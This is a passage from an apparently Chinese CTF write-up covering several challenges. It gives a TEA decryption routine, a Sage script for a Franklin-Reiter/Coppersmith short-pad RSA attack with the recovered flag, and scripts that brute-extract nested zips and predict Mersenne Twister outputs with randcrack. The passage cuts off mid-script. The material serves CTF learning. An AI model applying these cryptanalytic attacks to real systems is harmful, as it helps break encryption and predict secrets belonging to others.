class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="aet-reverse"><a href="#aet-reverse" class="headerlink" title="aet-reverse"></a>aet-reverse</h2><p>tea加密相关的，抄代码，然后将顺序调换即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">decode</span><span class="params">(<span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+8h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+Ch] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+10h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+14h] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+1Ch] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+20h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+24h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// [esp+28h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// [esp+2Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v7 = (<span class="number">3</span> &lt;&lt; <span class="number">8</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">0</span> &lt;&lt; <span class="number">24</span>) | <span class="number">4</span>;</span><br><span class="line">  v6 = (<span class="number">7</span> &lt;&lt; <span class="number">8</span>) | (<span class="number">6</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">5</span> &lt;&lt; <span class="number">24</span>) | <span class="number">8</span>;</span><br><span class="line">  v5 = (<span class="number">11</span> &lt;&lt; <span class="number">8</span>) | (<span class="number">10</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">9</span> &lt;&lt; <span class="number">24</span>) | <span class="number">12</span>;</span><br><span class="line">  v4 = (<span class="number">15</span> &lt;&lt; <span class="number">8</span>) | (<span class="number">14</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">13</span> &lt;&lt; <span class="number">24</span>) | <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; <span class="number">4</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">0x20</span>*<span class="number">0x9E3779B9</span>;</span><br><span class="line">    v12 = ((*(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">2</span> + a2)&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">8</span>) | ((*(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">1</span> + a2)&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">16</span>) | ((*(<span class="keyword">char</span> *)(<span class="number">8</span> * i + a2)&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">24</span>) | (*(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">3</span> + a2))&amp;<span class="number">0xff</span>;</span><br><span class="line">    v11 = ((*(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">6</span> + a2)&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">8</span>) | ((*(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">5</span> + a2)&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">16</span>) | ((*(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">4</span> + a2)&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">24</span>) | (*(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">7</span> + a2)&amp;<span class="number">0xff</span>);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">0x1F</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 -= (v12 + v10) ^ (<span class="number">16</span> * v12 + v5) ^ ((v12 &gt;&gt; <span class="number">5</span>) + v4);</span><br><span class="line">      v12 -= (v11 + v10) ^ (<span class="number">16</span> * v11 + v7) ^ ((v11 &gt;&gt; <span class="number">5</span>) + v6);</span><br><span class="line">      v10 -= <span class="number">0x9E3779B9</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(<span class="keyword">char</span> *)(<span class="number">8</span> * i + a2) = (v12/<span class="number">0x1000000</span>)&amp;<span class="number">0xff</span>;</span><br><span class="line">    *(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">1</span> + a2) = (v12/<span class="number">0x10000</span>)&amp;<span class="number">0xff</span>;</span><br><span class="line">    *(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">2</span> + a2) = (v12/<span class="number">0x100</span>)&amp;<span class="number">0xff</span>;</span><br><span class="line">    *(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">3</span> + a2) = (v12)&amp;<span class="number">0xff</span>;</span><br><span class="line">    *(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">4</span> + a2) = (v11/<span class="number">0x1000000</span>)&amp;<span class="number">0xff</span>;</span><br><span class="line">    *(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">5</span> + a2) = (v11/<span class="number">0x10000</span>)&amp;<span class="number">0xff</span>;</span><br><span class="line">    *(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">6</span> + a2) = (v11/<span class="number">0x100</span>)&amp;<span class="number">0xff</span>;</span><br><span class="line">    *(<span class="keyword">char</span> *)(<span class="number">8</span> * i + <span class="number">7</span> + a2) = (v11)&amp;<span class="number">0xff</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">0x20</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">strcpy</span>(a,<span class="string">"\x42\xC7\xCA\x40\xC1\x75\x16\xEF\xE7\x37\x6E\x69\x1B\x0B\x0F\x78\xDF\xE0\xE0\x7B\x5F\x50\x57\x05\xF4\x73\xD2\x35\x47\xD5\x6C\x5A"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s\n"</span>,a);</span><br><span class="line">decode(a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s\n"</span>,a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="backdoor"><a href="#backdoor" class="headerlink" title="backdoor"></a>backdoor</h2><p>根据题目提示直接搜索rootkit即可在附近发现flag：</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="wp.assets/image-20210823152243990.png" alt="image-20210823152243990"></p><h2 id="hello"><a href="#hello" class="headerlink" title="hello"></a>hello</h2><p>流量包中可以发现两个密文：</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="wp.assets/image-20210823152307164.png" alt="image-20210823152307164"></p><p>因为只是padding不同，且位数较短，利用<a href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/index.html" target="_blank" rel="noopener">Franklin-Reiter攻击</a>方法，在<a href="https://sagecell.sagemath.org/" target="_blank" rel="noopener">sage</a>上执行代码即可获得flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#脚本2</span></span><br><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">short_pad_attack</span><span class="params">(c1, c2, e, n)</span>:</span></span><br><span class="line">    PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+y)^e - c2</span><br><span class="line">    q1 = g1.change_ring(PRZZ)</span><br><span class="line">    q2 = g2.change_ring(PRZZ)</span><br><span class="line">    h = q2.resultant(q1)</span><br><span class="line">    h = h.univariate_polynomial()</span><br><span class="line">    h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">    h = h.monic()</span><br><span class="line">    kbits = n.nbits()//(<span class="number">2</span>*e*e)</span><br><span class="line">    diff = h.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line">    <span class="keyword">return</span> diff</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">related_message_attack</span><span class="params">(c1, c2, diff, e, n)</span>:</span></span><br><span class="line">    PRx.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+diff)^e - c2</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(g1, g2)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    c1 =<span class="number">226199888918448644756982227968746328321985116022301858554198443672166664046511192215268564345898426376094090283902459640110441636420726770010000770994806563185277269200465979320365589893377418069091918532090442396603886751603663167305733566867710881487792435263851954036765024355077627565776101657845285994047225127259478223888842725657697619882058952675576467950522546405944727325816748748400930757072151974753803411875075825410215662132323783283622907642504349895222420194846774972358784353404930471430363282533597528847457511272893938256828008761907527515772662467469811929535936626565593800263948227574689518705440414368634213587105988741446978367368641973256822769215908784220309789734449328751828411012817796805182907296099522060377249696752489510340595152805018457215119257756500416362241433542631282380670560802965990054464183825706649810872267539076088793023183611390929368000088538174212497557317021558232130649505658714311457845634746833717519922531826151283006638342214774466523934632839617828984102088907011083393633695252458688340500110194100303563736683350582103762865754280928068416609493507422758397519930389697891015054896887103350205876203508540259064385048758693455947681367170495861484799223471818419141809766082</span></span><br><span class="line">    c2 =<span class="number">207745134179372733555510206619693253104579843394896629739037329373112962626246001660692996105153219118802888232147542928402067843843528586661320609669764821619654148259323979346482619518127693134276997096465301242211338219230471535362522814373937363157952621289752500159789059618277078792730676938098151778724478618510442014061057398587899271302933994977686954557140792181120737121774640968270568182678321489463357386240195482174580855571460603588887113368877542370808084357842481355072918452814741564939655765498035870034623573615277107259501397135275787715228937905326258102800307298720705403841763666842176243959137647629868288744563301081604801635616954497347143042211051515138964208862089552048752128912810909730479659450966735343696566762894334249104817494914722566979492521404452789748171845406174662299522224640406957367515731398609433619859550730046552804426613174272338408295496475455377327126232203966170727191424458552984898420495331422888174501682405492889556485885498653026394829501033795561393942827468916484256939660461234831948497296037001984268948594694380490331513700030501310813656424424549981824937813623457529801230191235415350842735918693953674061739761952989693408739389294218794993885245118233185798993030811</span></span><br><span class="line">    n =<span class="number">614841097302605203729955929451825826385630731245407304765444050136152160075416270232196891310754756560269306196561606156336813576913594854840164982931848631424774407292521710362012687934093478900284954122708280664707569091235654868301000525395360078939629380968427451630817415966643152395544725253378817336057650951709472150327395955690738068905556599556048143267959045123493403335580464278218470115001795745184558268225092224619641577591099718668732317701349174398992357749748300972812469018580873052325022765470680889385640174127657770334108999912438577122235575684290868585158464471335044106696596310903161046624897870198499582743991296379992702316645220124590338066703166528127792814503559512520239899562796644117918668854617138574268684819163423283186676870272524173353359508565110680846340027745804501343277615801570161341159399030712301208921532219260984718701528073369562514559969874210515647810613697008011307213411257388079256334292994617864207389735727092704030522132125141994059978274145655095107101848352464355417969218835698138188967409918358594915938655738516761338882364547606993485361276412819595508391665123030799494192932148904512867616718323946620838822942360634114453262536609403878810013093786418173028142285209</span></span><br><span class="line">    e =<span class="number">7</span></span><br><span class="line">    diff = short_pad_attack(c1, c2, e, n)</span><br><span class="line">    m1 = related_message_attack(c1, c2, diff, e, n)</span><br><span class="line">    print(binascii.unhexlify(<span class="string">"%x"</span> % int(m1)))</span><br><span class="line">    </span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">b'You are so good at Coppersmith! Here is flag: flag&#123;congratulations_let#s_hacK_4_fun&#125;J"\xdd\x03'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h2 id="prophet"><a href="#prophet" class="headerlink" title="prophet"></a>prophet</h2><p>压缩包的密码是压缩包名，写个脚本循环解压：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line">filename = <span class="string">"2907706324.zip"</span></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">while</span> (filename.endswith(<span class="string">".zip"</span>) <span class="keyword">and</span> filename != <span class="string">"unknown.zip"</span>):</span><br><span class="line">    data.append(filename.strip(<span class="string">".zip"</span>))</span><br><span class="line">    file = zipfile.ZipFile(filename)</span><br><span class="line">    nextFile = file.namelist()[<span class="number">0</span>]</span><br><span class="line">    file.extractall(pwd=bytes(filename.split(<span class="string">"."</span>)[<span class="number">0</span>], encoding=<span class="string">'ascii'</span>))</span><br><span class="line">    filename = nextFile</span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure><p>最后会解压到 unknown.zip，用Python的 randcrack 库，首先在前面的解压中把随机数整理后得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2907706324, 3954914986, 3402108112, 2054213659, 535557466, 3669544554, 2651712950, 3417770286, 4111425735, 3450915372, 3509237967, 2707743668, 889955106, 101861478, 1336215387, 3605515990, 2504989551, 1349201253, 2648082710, 2601629531, 318049225, 645746114, 3181236701, 1354915347, 4222461704, 843752451, 304987850, 818779778, 2376864436, 4258684562, 3790514089, 2536866185, 3429670676, 700863894, 2368789662, 2954948787, 1850501693, 1935300318, 4294954886, 73605939, 790901430, 3142640071, 3691984007, 1373060993, 903416285, 3121969731, 1482630290, 3383153547, 4063302022, 3991027797, 4137420745, 3132346033, 1308129484, 3547926414, 3109764388, 708591644, 1817081225, 2668947004, 4263919904, 1115482359, 3856868064, 2830700281, 2281684679, 690656972, 1556659173, 3404632260, 3760484167, 1087153620, 4194906349, 1078862195, 2976233215, 1912726912, 30407312, 3942988489, 3908451981, 3898279239, 3281283879, 3497758064, 2782905320, 2430005846, 2035396750, 4225190092, 2269868098, 3586253265, 941460198, 714278381, 3535781796, 224084415, 1439629664, 4073938538, 3695945333, 3790821082, 1641312648, 3482321608, 3915303085, 1915159805, 3430976961, 1840044358, 3171835875, 2774047027, 1987332515, 3855846206, 2973653262, 3838867780, 611114104, 226329481, 1915513324, 3700256481, 43035897, 497049019, 4217044844, 2614275824, 744712097, 182795116, 2163976688, 4263470614, 725414906, 921626470, 3746191361, 1308296962, 1147642242, 4092217985, 3542284802, 1521845264, 2075371081, 816611597, 3041634562, 233907246, 1795167862, 3915308548, 491352142, 930583074, 1708980296, 308506013, 3810969309, 3157296753, 2967229333, 1571219325, 1291393249, 1593315655, 3882964486, 1017041435, 1857378099, 1824352034, 3349753470, 674061228, 1009504030, 2542637984, 371165771, 2479782679, 1480344967, 2869593526, 1330829984, 2722781682, 283801038, 3707346602, 4001933200, 2349491114, 1250027640, 1970245425, 171593507, 826464228, 2984624889, 1700335730, 1127890176, 2298521410, 3038015291, 3114969709, 2198496951, 3020449005, 2670289699, 1384619269, 691171966, 3223611927, 2151567537, 1625186327, 2435311123, 3729455475, 2620432733, 3211878875, 241902387, 422789850, 1633356868, 244191996, 499735365, 764962662, 1681584826, 427035682, 880783233, 1389830348, 1256307054, 1454192222, 3867551829, 1911723809, 394921086, 1072555848, 3834541849, 2720240412, 4083254853, 1463684341, 2807310132, 3989708760, 4287462606, 4065391879, 2946216593, 4274887668, 960363676, 3337566213, 2138750961, 3655949854, 138734513, 128284098, 1062990215, 3761988182, 1513533102, 845839023, 1734162676, 3029907057, 3437833787, 3858879164, 2270111112, 1830381909, 1534981723, 622364075, 2734894006, 3830057679, 550477468, 2555713963, 2687705967, 397294684, 3910881510, 3725223603, 2429728499, 1711990756, 4237787834, 2814436797, 2366793701, 868414597, 2185265697, 4003527750, 510159467, 281768698, 2839069975, 414584629, 841160842, 2248608666, 3581589648, 3224270545, 2113148121, 1552518857, 3606499351, 3204575349, 1595467803, 2880744010, 1317665514, 3437941254, 110923457, 278638319, 2683805720, 2816402957, 2117760685, 4054884851, 760362861, 2010439063, 3484464314, 302788119, 1394375925, 3571572324, 2666609477, 1853851652, 3970831431, 2738683685, 2259326865, 3704336022, 1519256231, 3644881529, 104403453, 1142252920, 2572082756, 2489933602, 2709723501, 186737154, 980884132, 1865172639, 2329728320, 3876911386, 3201931453, 2772783460, 661942251, 2402901175, 3570219339, 549076455, 1690874019, 2055566646, 2662268000, 4183765260, 1452482414, 2583855929, 948034686, 2853630447, 664902618, 2764279019, 740228037, 679334472, 1068533991, 1825024640, 105521362, 2758306319, 1561107818, 2855860411, 3944090887, 1155572417, 2222936476, 2982018743, 3826797015, 993277428, 3606014829, 2651099474, 183026480, 3850093664, 1946575336, 1458018383, 919408507, 3035932662, 666805284, 2368179406, 293503818, 306642195, 1174454622, 147082512, 3045274465, 1118557200, 2280283457, 1140154721, 1589304916, 2707734613, 2687607369, 3181595711, 1786880670, 614492265, 1727186681, 616992393, 2647336831, 1328574427, 3419233391, 86915267, 791316613, 2947942465, 1207262633, 4032471359, 110173792, 580028332, 3200100754, 1443892133, 4158469394, 2866259043, 1777066304, 2631121839, 3066797076, 913793049, 500723146, 4250565153, 3140000049, 4006124671, 1557687908, 3097026744, 1600577917, 3475167182, 4190641526, 1975505102, 2746146674, 4183482895, 3942160073, 1130897678, 655001677, 1503469355, 1589952677, 289068625, 404635291, 546675708, 4243969683, 92985514, 435955479, 2070686379, 269130310, 2458267416, 230795995, 2268807924, 4152347460, 883606733, 3649663604, 1939496305, 3144082131, 1020316188, 3643489526, 991785797, 2377699574, 1064114897, 3925872718, 3153908492, 3402689587, 729363836, 3146706653, 422102318, 781824325, 2070158255, 3452344097, 1855915077, 278758154, 2809776511, 3655551017, 1427426112, 3686861685, 1715461553, 3169333119, 400766497, 849152388, 3842058653, 3324504004, 2110816760, 1993886168, 2469709606, 1634363898, 451167479, 1791892046, 3639050937, 3326490342, 3138524672, 3683265170, 1733092879, 3943402096, 3178043886, 3263958674, 2945303049, 4030290823, 3890019934, 4072034359, 1491936406, 61358117, 3877008624, 4128962903, 3153897248, 2029311561, 1711005874, 1555958789, 2460011603, 1480475039, 2029023339, 3898772821, 813779337, 3274928705, 122738867, 326424966, 2636370832, 3504714095, 4243999766, 2552626959, 1698341626, 1110935776, 3393273826, 3735680822, 3013017650, 3968600483, 3916227526, 4062882707, 4124072198, 2274124478, 2769833441, 2147761328, 3979664881, 591506957, 1000835552, 1953837853, 3630957255, 1526381419, 1320001636, 804577210, 2780887882, 57522122, 2034965857, 1092740256, 3343601480, 316588755, 856922510, 3000844043, 277993279, 2628947374, 2800837999, 3540281314, 1131935058, 2554699772, 2983012006, 3462033745, 3747092723, 2082631046, 1249369550, 1399656050, 1380244778, 3654315687, 30864042, 3601038453, 1812382865, 3977191364, 3375851263, 2615653275, 4121914158, 4067727195, 4215992615, 50813272, 3422137608, 1214655257, 2262352860, 1445338275, 1049642872, 817141685, 3537094077, 1735027729, 4235889837, 2173890300, 4024475021, 435474311, 417920911, 2752551821, 10146419, 1584825302, 2581381951, 4078884446, 2091842886, 2635154217, 1512293963, 4240561542, 2569831040, 3062146866, 2413003376, 2056726083, 137699216, 2817513365, 847863437, 1348716639, 264518910, 1581262871, 3687371459, 4081927416, 3402250258, 1538729417, 58632833, 418582971, 3579226914, 1710281441, 3968026001, 3072229268, 3255655022, 443028273, 1781242768, 845963258, 1474822808, 2287289816, 3140795568, 647767985, 3201933540, 3344108747, 3156561341, 2135178605, 3977772423, 1091627310, 3387469991, 3480076167, 998455889, 3932962822, 556790737, 3462656387, 1354331856, 331339457, 89589652, 2169976628, 499723289, 4248480190, 459434352, 1756143408, 609517004, 1625850533, 1055607475, 4078436277, 178892738, 2639443481, 1643997964, 209795222, 4031695509, 515771499, 3844892252, 1509762710, 3467911440, 2990611802, 4108349538, 1251780874, 1275943948, 2750712131, 457664709, 1234644717, 3894274138, 779659511, 1022790972, 3587520181, 4114414679, 1788862106, 784942685, 2032827515, 97699241, 502970796, 208621053, 618199448, 869691038, 1315708708, 2950393537, 316695424, 3204417376, 2157414925, 1986435697, 578058463, 2226332610, 45889470, 1939749473, 4277520616, 716509244, 3148642698, 2619738742, 395812501, 2611816764, 120484619, 3803132111, 3028743725, 3032307726, 3558459801, 2286359562, 3242070811, 2972037405, 2409275190, 333056311, 1628673919, 1222753699, 3226124314, 510049636, 1798218781, 3286822755, 2050136383, 363266297, 753159469, 1339229922, 3282010884, 3964577747, 1183093495, 3665656653, 1802113568, 586211819, 1906435982, 407943402, 3478960696, 1221962222, 2646386190, 2344832406, 3568499138, 3479343149, 1044214259, 2255694969, 2629616514, 3767094630, 366310899, 2466889679, 2533941943, 2817371332, 478094315, 3077780922, 1917154805, 3668750533, 77295478, 258422916, 3929257613, 3653596300, 749676172, 2250390103, 1052624843, 2563981631, 519704737, 2969422268, 1628120157, 4100859626, 252141936, 2978131799, 1142247725, 3804721174, 1356078034, 1198864435, 2564872115, 3858385849, 3652532995, 305266060, 482238871, 1451662628, 2189662472, 4225060244, 3266478407, 298473768, 1328477173, 1872099590, 380059855, 912553536, 2099522339, 3224313555, 2056296410, 477848639, 379190417, 3487993484, 3121969521, 2288925162, 3077843604, 1456549673, 1304340342, 2083447579, 3167117719, 3348095325, 2268107766, 1402643313, 2397212057, 1352006746, 231921187, 1313920238, 2168273889, 805130323, 2816803714, 3720840652, 3407591957, 479785258, 1217833088, 4229273758, 587760181, 1233711591, 2930015733, 3697241657, 570349524, 1000281623, 2960131310, 3941057032, 3611068081, 1929535695, 1078174814, 549556557, 2427930182, 1127864687, 3728874623, 1552852683, 246530969, 3129577778, 2828503428, 741919312, 215642980, 1167747156, 1074184265, 1803181867, 1728287989, 3994497806, 3166040995, 4102870506, 2533028438, 1554448227, 1743174913, 2757654175, 1620162669, 2326525927, 1822891531, 3118838616, 988494514, 724274952, 3466926668, 2858066332, 1508595710, 2951666140, 1637995296, 2345022808, 4293996946, 2531108812, 1393641667, 3609374661, 1294467284, 1466747081, 1787125071, 418589219, 2105433503, 2486534005, 1556969350, 4187693157, 2376356641, 2760842106, 3305118691, 2311132184, 2756948087, 3686050208, 1794448609, 2080775564, 2924248445, 2178418677, 4158669833, 3219430073, 967669386, 221829347, 730413000, 4032488141, 861524009, 3520395384, 229287210, 2928013323, 634603946, 2344109932, 2651517581, 2956026520, 3962896689, 752853056, 1576906191, 420644394, 1259665633, 1833948237, 1550770827, 2065923435, 4174111849, 3128201235, 2682226239, 3167161894, 576977612, 2487367426, 2431206872, 3390561516, 2334384070, 3436416734, 2200879126, 3180692685, 2766121590, 1064218408, 410199199, 20022323, 1718513066, 3297953226, 451443686, 2132362103, 257410781, 1541671484, 3761895270, 348365872, 816022713, 4294497492, 2625738817, 3603223866, 3078033498, 1147648777, 3514932557, 2930781580, 984846570, 4212244974, 1020179629, 3382552365, 3588342390, 2485187463, 2828961807, 4136474278, 3551225472, 4086885006, 1310692642, 2241965503, 1504390196, 1603497325, 1455103646, 366434701, 293869916, 1550592307, 4214651425, 4250886934, 1306227123, 4036718626, 2933260006, 762182112, 1830993485, 2128141366, 44628368, 2873401036, 1257136753, 3380864990, 4275919402, 789867953, 3318150127, 487054724, 3730547753, 1936887664, 171225030, 3722592745, 1340948219, 1016521820, 1447577763, 2805353516, 1417994373, 817439704, 3813079978, 1200757040, 339005780, 4232371651, 1296406800, 805088113, 2812427961, 3875582523, 4113860721, 1947280914, 3775671015, 955163233, 3603928099, 91477649, 3287607536, 4201104916, 2491411596, 460805757, 1332051516, 3368474042, 3164283116, 2874896056, 293562372, 411629539, 2220832875, 2299167075, 2579299726, 2882735860, 2668845063, 42813252, 917639463, 2216449232, 2644803904, 2031826548, 3452099002, 1103665712, 1070395870, 532734790, 4097725963, 581033399, 963298035, 823792656, 3525861586, 20973404, 2359012004, 3432019008, 2233316197, 697890212, 3568807990, 3652343610, 1398136840, 937985297, 2581792527, 2566945713, 1386694986, 2557383413, 1945328836, 1021712351, 3289407095, 2323689998, 3306271310, 3585440682, 1855892766, 2796595085, 2504479613, 1289850575, 2929745242, 2021810381, 3242210155, 3055960700, 365068549, 2513400611, 553638319, 3920510223, 2495696848, 1824819128, 1213008255, 4189990551, 1989970719, 1031033434, 531275736, 882122649, 1721700980, 3178163802, 3700771996, 1850869451, 3206165832, 1272158460, 3303927391, 4119824836, 3968831781, 3771252104, 1674478394, 530327252, 9184370, 2681387057, 1178553319, 1950066334, 3127696976, 2661749414, 1383174577, 4201508029</span><br></pre></td></tr></table></figure><p>另存为 data.txt，预测下一个随机数后对 unknown.zip 进行解压，然后把新的密码 append 到数组后面，最新的 624 个数字再预测下一个压缩包的密码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> randcrack</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">predict</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(data) == <span class="number">624</span></span><br><span class="line">    rc = randcrack.RandCrack()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        rc.submit(int(i))</span><br><span class="line">    <span class="keyword">return</span> rc.predict_randrange(<span class="number">0</span>, <span class="number">4294967295</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uncompress</span><span class="params">(password)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">"temp.zip"</span>):</span><br><span class="line">        os.remove(<span class="string">"temp.zip"</span>)</span><br><span class="line">    os.rename(<span class="string">"unknown.zip"</span>, <span class="string">"temp.zip"</span>)</span><br><span class="line">    file = zipfile.ZipFile(<span class="string">"temp.zip"</span>)</span><br><span class="line">    file.extractall(pwd=bytes(str(password), encoding=<span class="string">'ascii'</span>))</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"data.txt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read().split(<span class="string">", "</span>)</span><br><span class="line">data = data[<span class="number">-624</span>:]</span><br><span class="line"><span class="keyword">while</span> <span 